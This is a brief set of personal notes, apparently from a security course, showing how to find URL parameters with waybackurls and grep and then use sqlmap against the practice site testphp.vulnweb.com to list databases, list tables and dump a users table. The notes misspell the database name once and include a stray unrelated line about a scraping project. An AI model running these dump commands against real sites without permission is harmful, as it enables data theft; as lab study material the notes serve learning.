
## SQL Mapping 

Used to check if a site has a **SQL Injection**
```
sqlmap -h
```
for help menu of sqlmap

```
waybackurls testphp.vulnweb.com > vulnweb.txt

```

for finding all types of urls

use grep command to find the urls

```
 grep -roP '\.php\?\K[^=]+' vulnweb.txt   

```

for sqlmap

- Project -> web scrapping tool using ai as api


use sql map 
```
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?artist=2 --dbs     
```

we find a database named *acurat*

```
└─$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?artist=2 -D acuart --tables

```


```
└─$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?artist=2 -D acuart -T users --dump  
```

